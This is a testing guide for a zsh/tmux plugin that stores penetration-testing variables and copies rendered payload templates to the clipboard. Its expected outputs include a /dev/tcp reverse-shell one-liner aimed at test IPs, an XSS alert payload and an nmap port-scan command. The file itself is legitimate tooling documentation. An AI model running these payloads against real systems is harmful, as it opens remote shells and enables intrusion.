# Testing

All commands below assume the repo is at:

```text
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
```

## Syntax Check

Run from repo root:

```zsh
zsh -n ii.plugin.zsh
zsh -n lib/*.zsh
```

## Local Plugin Load Check

This does not require tmux:

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
zsh -fc 'source ./ii.plugin.zsh && type ii && ii p --help >/dev/null && print $II_PAYLOAD_DIR'
```

Expected result:

```text
ii is a shell function
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali/payloads
```

## Payload Category Filter Check

This verifies that `script` is a supported payload category and dotfiles used to
keep empty directories are not shown as payload entries.

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
zsh -fc 'source ./ii.plugin.zsh; ii_payload_list | grep -q "^script/.gitkeep$" && print bad || print ok'
zsh -fc 'source ./ii.plugin.zsh; print script/custom | ii_payload_filter script'
zsh -fc 'source ./ii.plugin.zsh; rendered="$(ii_payload_render payloads/script/tool/nmap/nmap)"; print -r -- "$rendered" | grep -Fq "sudo nmap -p- -Pn -T4 \$rhost" && print ok'
zsh -fc 'source ./ii.plugin.zsh; ii_payload_preview script/tool/nmap/nmap | grep -Fq "sudo nmap -p- -Pn -T4 \$rhost" && print ok'
```

Expected result:

```text
ok
script/custom
ok
ok
```

Expected script copy sign:

```text
sudo nmap -p- -Pn -T4 $rhost
```

## Single Pane tmux Smoke Test

Run from outside or inside tmux. It creates an isolated session named
`codex-jj-test`.

```zsh
tmux kill-session -t codex-jj-test 2>/dev/null || true
tmux new-session -d -s codex-jj-test -x 120 -y 40 zsh
tmux send-keys -t codex-jj-test "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-test "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-jj-test "ii s LHOST 127.0.0.1" Enter
tmux send-keys -t codex-jj-test "ii s LPORT 4444" Enter
tmux send-keys -t codex-jj-test "ii s DOMAIN example.test" Enter
tmux send-keys -t codex-jj-test "ii ls" Enter
tmux send-keys -t codex-jj-test "ii ls host" Enter
tmux send-keys -t codex-jj-test "ii l" Enter
tmux send-keys -t codex-jj-test "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-jj-test -p -S -200
tmux show-buffer
tmux kill-session -t codex-jj-test
```

Expected payload:

```text
/bin/sh -i >/dev/tcp/127.0.0.1/4444 2>&1 0>&1
```

Expected used variables:

```text
lhost used: 127.0.0.1
lport used: 4444
```

## Cross Pane tmux Test

This verifies that `ii p` reads tmux session values directly, without requiring
`ii l` in the rendering pane.

```zsh
tmux kill-session -t codex-jj-crosspane 2>/dev/null || true
tmux new-session -d -s codex-jj-crosspane -x 120 -y 40 zsh
tmux split-window -t codex-jj-crosspane zsh
tmux send-keys -t codex-jj-crosspane:0.0 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-crosspane:0.0 "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-jj-crosspane:0.0 "ii s LHOST 10.10.10.10" Enter
tmux send-keys -t codex-jj-crosspane:0.0 "ii s LPORT 9001" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "echo pane2-shell-before:\$LHOST" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-jj-crosspane:0.1 -p -S -120
tmux kill-session -t codex-jj-crosspane
```

Expected signs:

```text
pane2-shell-before:
/bin/sh -i >/dev/tcp/10.10.10.10/9001 2>&1 0>&1
lhost used: 10.10.10.10
lport used: 9001
```

## Payload Missing Variable Fallback Test

This verifies that missing payload variables render as lowercase shell fallback
references instead of blocking copy.

```zsh
tmux kill-session -t codex-ii-payload-fallback 2>/dev/null || true
tmux new-session -d -s codex-ii-payload-fallback -x 120 -y 30 zsh
tmux send-keys -t codex-ii-payload-fallback "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-payload-fallback "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-payload-fallback "printf 'y\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-payload-fallback "ii s LHOST 127.0.0.1" Enter
tmux send-keys -t codex-ii-payload-fallback "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
sleep 2
tmux capture-pane -t codex-ii-payload-fallback -p -S -140
tmux show-buffer
tmux kill-session -t codex-ii-payload-fallback
```

Expected signs:

```text
/bin/sh -i >/dev/tcp/127.0.0.1/$lport 2>&1 0>&1
lhost used: 127.0.0.1
lport used: $lport
```

## Special Character Copy Test

This verifies that rendered payloads are piped into tmux buffer through stdin
and are not broken by common shell metacharacters.

```zsh
tmux kill-session -t codex-jj-special 2>/dev/null || true
tmux new-session -d -s codex-jj-special -x 120 -y 40 zsh
tmux send-keys -t codex-jj-special "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-special "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-jj-special "ii s DOMAIN \"a b/c;whoami & test\"" Enter
tmux send-keys -t codex-jj-special "FZF_DEFAULT_OPTS='--filter=basic-alert' II_CLIP_CMD='tmux load-buffer -' ii p xss" Enter
sleep 2
tmux capture-pane -t codex-jj-special -p -S -120
tmux show-buffer
tmux kill-session -t codex-jj-special
```

Expected buffer:

```text
<script>alert('a b/c;whoami & test')</script>
```

## OSC52 Sequence Test

This verifies that the OSC52 backend encodes special-character payload text
without shell escaping loss. It does not prove that the local terminal accepts
OSC52 clipboard writes.

```zsh
zsh -fc 'source ./ii.plugin.zsh; ii_clip_osc52_sequence "a b/c;whoami & test" | base64 | tr -d "\n"'
```

Expected sign:

```text
G101MjtjO1lTQmlMMk03ZDJodllXMXBJQ1lnZEdWemRBPT0H
```

## Variable Guard Test

```zsh
tmux kill-session -t codex-jj-vars 2>/dev/null || true
tmux new-session -d -s codex-jj-vars -x 120 -y 30 zsh
tmux send-keys -t codex-jj-vars "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-vars "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-jj-vars "ii s GOOD_NAME ok" Enter
tmux send-keys -t codex-jj-vars "ii ls good" Enter
tmux send-keys -t codex-jj-vars "ii unset GOOD_NAME" Enter
tmux send-keys -t codex-jj-vars "ii ls good" Enter
tmux send-keys -t codex-jj-vars "ii set 'BAD-NAME' value" Enter
sleep 2
tmux capture-pane -t codex-jj-vars -p -S -100
tmux kill-session -t codex-jj-vars
```

Expected signs:

```text
GOOD_NAME=ok
unset GOOD_NAME
ii: invalid variable name: BAD-NAME
```

## Unset All Test

```zsh
tmux kill-session -t codex-ii-unset-all 2>/dev/null || true
tmux new-session -d -s codex-ii-unset-all -x 120 -y 30 zsh
tmux send-keys -t codex-ii-unset-all "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-unset-all "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-unset-all "ii s LHOST 192.0.2.10" Enter
tmux send-keys -t codex-ii-unset-all "ii s USER1 alice" Enter
tmux send-keys -t codex-ii-unset-all "printf 'n\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-unset-all "ii ls" Enter
tmux send-keys -t codex-ii-unset-all "printf 'y\n' | ii unset -a" Enter
tmux send-keys -t codex-ii-unset-all "ii ls" Enter
sleep 2
tmux capture-pane -t codex-ii-unset-all -p -S -160
tmux kill-session -t codex-ii-unset-all
```

Expected signs:

```text
aborted
lhost=192.0.2.10
user1=alice
unset lhost
unset user1
unset 2 variable(s)
```

## Variable View Test

```zsh
tmux kill-session -t codex-jj-views 2>/dev/null || true
tmux new-session -d -s codex-jj-views -x 120 -y 35 zsh
tmux send-keys -t codex-jj-views "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-views "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-jj-views "ii s LHOST 192.0.2.10" Enter
tmux send-keys -t codex-jj-views "ii s RHOST 198.51.100.20" Enter
tmux send-keys -t codex-jj-views "ii s LPORT 4444" Enter
tmux send-keys -t codex-jj-views "ii s USER1 alice" Enter
tmux send-keys -t codex-jj-views "ii s PASSWD1 secret" Enter
tmux send-keys -t codex-jj-views "ii s HASH2 deadbeef" Enter
tmux send-keys -t codex-jj-views "ii ls host" Enter
tmux send-keys -t codex-jj-views "ii ls user" Enter
tmux send-keys -t codex-jj-views "ii ls passwd" Enter
tmux send-keys -t codex-jj-views "ii ls hash" Enter
sleep 2
tmux capture-pane -t codex-jj-views -p -S -160
tmux kill-session -t codex-jj-views
```

Expected signs:

```text
lhost
192.0.2.10
rhost
198.51.100.20
lport
4444
user1
alice
passwd1
secret
hash2
deadbeef
```

## Lowercase Input And Load Test

This verifies that lowercase input maps to the same tmux variable as uppercase
input, and that unset default names are not loaded into the shell.

```zsh
tmux kill-session -t codex-ii-case 2>/dev/null || true
tmux new-session -d -s codex-ii-case -x 120 -y 30 zsh
tmux send-keys -t codex-ii-case "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-case "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-case "ii s user2 bob" Enter
tmux send-keys -t codex-ii-case "unset USER2 user2 PASSWD2 passwd2" Enter
tmux send-keys -t codex-ii-case "ii l" Enter
tmux send-keys -t codex-ii-case "echo user2:\$USER2/\$user2 passwd2:\${PASSWD2-unset}/\${passwd2-unset}" Enter
sleep 2
tmux capture-pane -t codex-ii-case -p -S -100
tmux kill-session -t codex-ii-case
```

Expected signs:

```text
user2=bob
loaded 1 variable(s)
user2:/bob passwd2:unset/unset
```

## Set Shortcut And Edit Test

This verifies that `ii s r`, `ii s:r`, and edit flow all target `RHOST`.

```zsh
tmux kill-session -t codex-ii-keys 2>/dev/null || true
tmux new-session -d -s codex-ii-keys -x 120 -y 40 zsh
tmux send-keys -t codex-ii-keys "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-keys "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-keys "ii s r 10.0.0.5" Enter
tmux send-keys -t codex-ii-keys "ii s:r 10.0.0.6" Enter
tmux send-keys -t codex-ii-keys "II_SET_VALUE_FILTER=10.0.0.7 ii s r" Enter
tmux send-keys -t codex-ii-keys "II_EDIT_VALUE_FILTER=10.0.0.8 ii_cmd_interactive_edit_variable RHOST" Enter
tmux send-keys -t codex-ii-keys "ii ls host" Enter
sleep 3
tmux capture-pane -t codex-ii-keys -p -S -200
tmux show-buffer
tmux kill-session -t codex-ii-keys
```

Expected signs:

```text
rhost=10.0.0.5
rhost=10.0.0.6
rhost=10.0.0.7
rhost=10.0.0.8
```

## Set Filter Match Test

This verifies `ii s FILTER` handling for one match, no matches, and multiple
matches.

```zsh
tmux kill-session -t codex-ii-set-match 2>/dev/null || true
tmux new-session -d -s codex-ii-set-match -x 120 -y 35 zsh
tmux send-keys -t codex-ii-set-match "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-set-match "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-set-match "II_SET_VALUE_FILTER=10.0.0.9 ii s r" Enter
tmux send-keys -t codex-ii-set-match "ii s nope" Enter
tmux send-keys -t codex-ii-set-match "FZF_DEFAULT_OPTS='--filter=LPORT' II_SET_VALUE_FILTER=443 ii s port" Enter
sleep 2
tmux capture-pane -t codex-ii-set-match -p -S -140
tmux kill-session -t codex-ii-set-match
```

Expected signs:

```text
rhost=10.0.0.9
no matched
lport=443
```

## Get Filter Match Test

This verifies `ii g FILTER` handling for one match, multiple matches, and abort.
It should copy and print selected values; abort should not copy anything.

```zsh
tmux kill-session -t codex-ii-get 2>/dev/null || true
tmux new-session -d -s codex-ii-get -x 120 -y 35 zsh
tmux send-keys -t codex-ii-get "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-get "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-get "ii s LHOST 10.10.10.10" Enter
tmux send-keys -t codex-ii-get "ii s RHOST 10.10.10.20" Enter
tmux send-keys -t codex-ii-get "II_CLIP_CMD='tmux load-buffer -' ii g l" Enter
tmux send-keys -t codex-ii-get "FZF_DEFAULT_OPTS='--filter=RHOST' II_CLIP_CMD='tmux load-buffer -' ii g host" Enter
tmux send-keys -t codex-ii-get "FZF_DEFAULT_OPTS='--filter=nomatch' ii g host; print abort:\$?" Enter
sleep 2
tmux capture-pane -t codex-ii-get -p -S -120
tmux show-buffer
tmux kill-session -t codex-ii-get
```

Expected signs:

```text
value copied successfully
10.10.10.10
10.10.10.20
abort:1
```

## Clipboard Backend Command Test

This verifies clipboard backend inspection and tmux-session scoped backend
settings.

```zsh
tmux kill-session -t codex-ii-clip 2>/dev/null || true
tmux new-session -d -s codex-ii-clip -x 120 -y 30 zsh
tmux send-keys -t codex-ii-clip "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-clip "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-clip "ii clip backend xclip-both" Enter
tmux send-keys -t codex-ii-clip "unset II_CLIP_BACKEND II_CLIP_CMD; ii clip backend" Enter
tmux send-keys -t codex-ii-clip "ii clip backend auto" Enter
sleep 2
tmux capture-pane -t codex-ii-clip -p -S -100
tmux kill-session -t codex-ii-clip
```

Expected signs:

```text
clipboard backend: xclip-both
backend: xclip-both
clipboard backend: auto
```

## Interactive Variable Copy Test

This uses fzf filter mode to verify that `ii i` copies selected variable values
with case-insensitive search. It should not load variables into the shell.

```zsh
tmux kill-session -t codex-ii-i 2>/dev/null || true
tmux new-session -d -s codex-ii-i -x 120 -y 30 zsh
tmux send-keys -t codex-ii-i "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-i "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-i "ii s LHOST 172.16.1.10" Enter
tmux send-keys -t codex-ii-i "unset LHOST lhost ii_lhost" Enter
tmux send-keys -t codex-ii-i "FZF_DEFAULT_OPTS='--filter=lhost' II_INTERACTIVE_KEY=ctrl-y II_CLIP_CMD='tmux load-buffer -' ii i" Enter
tmux send-keys -t codex-ii-i "echo loaded:\$LHOST/\$lhost" Enter
sleep 2
tmux capture-pane -t codex-ii-i -p -S -100
tmux show-buffer
tmux kill-session -t codex-ii-i
```

Expected signs:

```text
copied 1 variable value(s)
172.16.1.10
loaded:/
```

## Interactive Add Variable Test

This verifies that `ii i` can create a new variable through the final add
option, and that empty values are stored but skipped by `ii l`.

```zsh
tmux kill-session -t codex-ii-add 2>/dev/null || true
tmux new-session -d -s codex-ii-add -x 120 -y 35 zsh
tmux send-keys -t codex-ii-add "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-add "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=token II_ADD_VALUE_FILTER=abc123 ii i" Enter
tmux send-keys -t codex-ii-add "FZF_DEFAULT_OPTS='--filter=add' II_ADD_VAR_FILTER=emptytest II_ADD_VALUE_FILTER= ii i" Enter
tmux send-keys -t codex-ii-add "unset TOKEN token EMPTYTEST emptytest" Enter
tmux send-keys -t codex-ii-add "ii l" Enter
tmux send-keys -t codex-ii-add "echo token:\$TOKEN/\$token empty:\${EMPTYTEST-unset}/\${emptytest-unset}" Enter
sleep 2
tmux capture-pane -t codex-ii-add -p -S -140
tmux kill-session -t codex-ii-add
```

Expected signs:

```text
TOKEN=abc123
EMPTYTEST=
loaded 1 variable(s)
token:abc123/abc123 empty:unset/unset
```

## Interactive Set Test

This verifies `ii s` with no arguments. `II_SET_VAR_FILTER` and
`II_SET_VALUE_FILTER` make the two fzf steps deterministic for testing.

```zsh
tmux kill-session -t codex-ii-s-filter 2>/dev/null || true
tmux new-session -d -s codex-ii-s-filter -x 120 -y 35 zsh
tmux send-keys -t codex-ii-s-filter "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-ii-s-filter "source ./ii.plugin.zsh" Enter
tmux send-keys -t codex-ii-s-filter "II_SET_VAR_FILTER=LHOST II_SET_VALUE_FILTER=192.0.2.10 ii s" Enter
tmux send-keys -t codex-ii-s-filter "ii ls host" Enter
tmux send-keys -t codex-ii-s-filter "echo loaded:\$LHOST/\$lhost" Enter
tmux send-keys -t codex-ii-s-filter "echo hidden:\$ii_lhost" Enter
sleep 2
tmux capture-pane -t codex-ii-s-filter -p -S -120
tmux kill-session -t codex-ii-s-filter
```

Expected signs:

```text
lhost=192.0.2.10
loaded:/192.0.2.10
hidden:
```

## Manual Interactive Test

Inside an existing tmux session:

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
source ./ii.plugin.zsh

ii s LHOST 192.168.45.192
ii s LPORT 443
ii ls
ii i
ii p linux
```
